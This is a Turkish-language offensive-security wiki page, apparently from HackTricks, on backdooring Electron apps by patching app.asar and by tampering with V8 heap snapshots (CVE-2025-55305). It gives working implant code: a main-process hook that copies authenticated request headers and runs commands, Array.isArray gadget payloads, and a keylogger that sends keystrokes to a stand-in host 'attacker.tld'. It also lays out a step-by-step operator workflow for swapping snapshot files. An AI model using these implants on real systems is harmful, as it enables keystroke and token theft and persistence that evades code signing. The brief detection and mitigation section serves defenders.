# Electron Yerel Kod Enjeksiyonu ve Snapshot Kurcalama

{{#include ../../banners/hacktricks-training.md}}

## Electron Yerel Kod Enjeksiyonu

Yerel olarak yüklenmiş bir Electron uygulamasını değiştirebilir veya enstrümante edebilirseniz, uygulamanın rastgele JavaScript kodu çalıştırmasını sağlayabilirsiniz. Bkz.:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Yerel bir Node inspector veya Chromium DevTools debugging yüzeyi için bkz. [Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

## Post-exploitation: ASAR/main-process implants

Bir Electron uygulamasının kaynak dizinine **yazma erişimi** elde ederseniz, oldukça pratik bir post-exploitation yöntemi **`app.asar` dosyasını** (veya yüklediği JS entrypoint'ini) yamalayıp kullanıcının uygulamayı yeniden başlatmasını beklemektir. Yalnızca renderer'ı etkileyen bir XSS'den farklı olarak, **main process** tarafından yüklenen kod uygulamanın **Node.js runtime'ında** çalışır; bu nedenle genellikle **filesystem'e** erişebilir, komutlar başlatabilir, Electron API'lerini hook edebilir ve kimliği doğrulanmış uygulama durumunu inceleyebilir.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Tipik iş akışı:

1. `app.asar` dosyasını çıkarın ve `package.json` içindeki (`main`) veya mevcut başlangıç mantığındaki gerçek bootstrap dosyasını belirleyin.
2. **Main process** içine küçük bir loader ekleyin (veya bir preload/main-process hook'u kullanın) ve arşivi yeniden paketleyin.
3. Uygulamanın yeniden başlatılmasını bekleyin ve kullanıcı masaüstü uygulamasının kilidini açtıktan veya kimlik doğrulaması yaptıktan sonra runtime verilerini yakalamak için implantı kullanın.

Minimal bootstrap yaması örneği:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Pratik etkiler:

- **Güvenilir istemci verilerinin çalınması**: Masaüstü uygulaması kullanıcı için verilerin şifresini çözdüğünde veya verileri yüklediğinde implant bunları çalışma zamanından okuyabilir. Bu nedenle **E2EE mesajlaşma istemcileri** (Signal/Slack/Mattermost) ve **vault/secret manager** uygulamaları uç nokta katmanında hâlâ ilgi çekici hedeflerdir.
- **Oturum/token kötüye kullanımı**: Electron implantları, çalışan istemcinin erişimine açık uygulama çerezlerini, bearer token’larını, istek başlıklarını, çalışma alanı dosyalarını veya repo kimlik bilgilerini çalabilir (örneğin, kimliği doğrulanmış VS Code eklentileri ya da Git entegrasyonları).
- **Kurbanın bağlamını pivot olarak kullanma**: yamalanmış bir uygulama, yalnızca ham token’ları dışarı sızdırmak yerine kurbanın IP’sini, TLS fingerprint’ini ve uygulama oturumunu yeniden kullanarak istekleri kurbanın iş istasyonu üzerinden proxy’leyebilir.

> [!NOTE]
> Hedef **ASAR integrity** / **OnlyLoadAppFromAsar** veya hardened Electron **fuses** etkinleştiriyorsa farklı bir yerel kod yükleme yöntemi (örneğin, fuse abuse veya snapshot tampering) gerekebilir. Daha fazla yerel implant seçeneği ve fuse ayrıntıları için macOS’a özel injection sayfasına bakın.

## V8 heap snapshot tampering ile yerel arka kapı ekleme (Electron/Chromium) – CVE-2025-55305

Electron ve Chromium tabanlı uygulamalar, her V8 isolate’ını (main, preload, renderer) başlatmak için başlangıçta önceden oluşturulmuş bir V8 heap snapshot’ını (v8_context_snapshot.bin ve isteğe bağlı olarak browser_v8_context_snapshot.bin) deserialize eder. Tarihsel olarak Electron’ın integrity fuses mekanizması bu snapshot’ları yürütülebilir içerik olarak değerlendirmediğinden, snapshot’lar hem fuse tabanlı integrity enforcement denetimlerinden hem de işletim sistemi code-signing kontrollerinden kaçıyordu. Sonuç olarak, kullanıcı tarafından yazılabilir bir kurulum dizinindeki snapshot’ı değiştirmek; imzalı binary’leri veya ASAR’ı değiştirmeden uygulama içinde gizli ve kalıcı kod yürütme olanağı sağlıyordu.<sup>[[2]](#references)</sup>

Önemli noktalar
- Integrity açığı: EnableEmbeddedAsarIntegrityValidation ve OnlyLoadAppFromAsar, ASAR içindeki uygulama JavaScript’ini doğrular; ancak V8 heap snapshot’larını kapsamıyordu (CVE-2025-55305). Chromium da snapshot’ların integrity’sini denetlemez.<sup>[[3]](#references)[[4]](#references)</sup>
- Saldırı ön koşulları: Uygulamanın kurulum dizinine yerel dosya yazma erişimi. Bu, Electron uygulamalarının veya Chromium tarayıcılarının kullanıcı tarafından yazılabilir konumlara kurulduğu sistemlerde yaygındır (ör. Windows’ta %AppData%\Local; macOS’ta bazı koşullarda /Applications).
- Etki: Sık kullanılan bir yerleşik öğenin (“gadget”) üzerine yazarak herhangi bir isolate içinde saldırgan JavaScript’inin güvenilir biçimde yürütülmesi; böylece kalıcılık ve code-signing doğrulamasından kaçınma sağlanır.
- Etkilenen alan: Electron uygulamaları (fuses etkin olsa bile) ve snapshot’ları kullanıcı tarafından yazılabilir konumlardan yükleyen Chromium tabanlı tarayıcılar.

Chromium derlemeden kötü amaçlı snapshot oluşturma
- Payload JS’ini snapshot’a derlemek ve uygulamanın v8_context_snapshot.bin dosyasının üzerine yazmak için önceden derlenmiş electron/mksnapshot aracını kullanın.<sup>[[5]](#references)[[6]](#references)</sup>

Örnek minimal payload (çökme oluşturarak yürütmeyi kanıtlama)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Isolate-aware payload routing (main ve renderer'da farklı kod çalıştırma)
- Main process tespiti: process.pid, process.binding() veya process.dlopen gibi yalnızca Node'a özgü global'ler, main process isolate'ında bulunur.
- Browser/renderer tespiti: alert gibi yalnızca browser'a özgü global'ler, document bağlamında çalışırken kullanılabilir.

Main process Node yeteneklerini bir kez yoklayan örnek gadget
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

Renderer/tarayıcı bağlamı veri hırsızlığı PoC’si (örn. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Operatör iş akışı
1) Yaygın bir yerleşik öğeyi (ör. Array.isArray) clobber eden ve isteğe bağlı olarak isolate başına dallanan payload.js dosyasını yazın.
2) Chromium kaynakları olmadan snapshot'ı oluşturun:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Hedef uygulamanın snapshot dosyalarını değiştirin:
   - v8_context_snapshot.bin (her zaman kullanılır)
   - browser_v8_context_snapshot.bin (LoadBrowserProcessSpecificV8Snapshot fuse'u kullanılıyorsa)
4) Uygulamayı başlatın; gadget, seçilen yerleşik öğe her kullanıldığında çalışır.

Notlar ve dikkat edilmesi gerekenler
- Bütünlük/imza denetimini atlatma: Kod imzalama denetimleri snapshot dosyalarını yerel çalıştırılabilir dosyalar olarak değerlendirmez ve tarihsel olarak bu dosyalar Electron fuse'ları veya Chromium bütünlük denetimleri kapsamına alınmamıştır.
- Kalıcılık: Kullanıcının yazabildiği bir kurulum dizinindeki snapshot'ı değiştirmek genellikle uygulama yeniden başlatıldığında da kalır ve imzalı, meşru bir uygulama görünümünü korur.
- Chromium tarayıcıları: Aynı kurcalama yaklaşımı, kullanıcının yazabildiği konumlara kurulu Chrome ve türevleri için de geçerlidir. Chrome'da başka bütünlük önlemleri vardır, ancak fiziksel olarak yerel saldırıları tehdit modelinin açıkça dışında tutar.<sup>[[9]](#references)[[10]](#references)</sup>

Tespit ve azaltma yöntemleri
- Snapshot'ları çalıştırılabilir içerik olarak değerlendirin ve bütünlük denetimine dahil edin (CVE-2025-55305 düzeltmesi).
- Yalnızca yöneticinin yazabildiği kurulum konumlarını tercih edin; v8_context_snapshot.bin ve browser_v8_context_snapshot.bin dosyalarının hash değerlerini temel değer olarak belirleyip izleyin.
- Erken çalışma zamanındaki yerleşik öğe clobbering işlemlerini ve beklenmeyen snapshot değişikliklerini tespit edin; deserialize edilen snapshot'lar beklenen değerlerle eşleşmediğinde uyarı verin.

## References

- [1] [JS-Tap v3: JavaScript implantlarıyla uç nokta post-exploitation](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Kod bütünlüğü denetimlerini aşarak Signal, 1Password, Slack ve diğerlerine yerel arka kapı ekleme](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Electron fuse'ları](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Electron ASAR bütünlüğü](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [V8 özel başlangıç snapshot'ları](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: İmzasız kodun yüklenmesini devre dışı bırakma (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Chrome güvenlik SSS: fiziksel olarak yerel saldırılar kapsam dışıdır](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
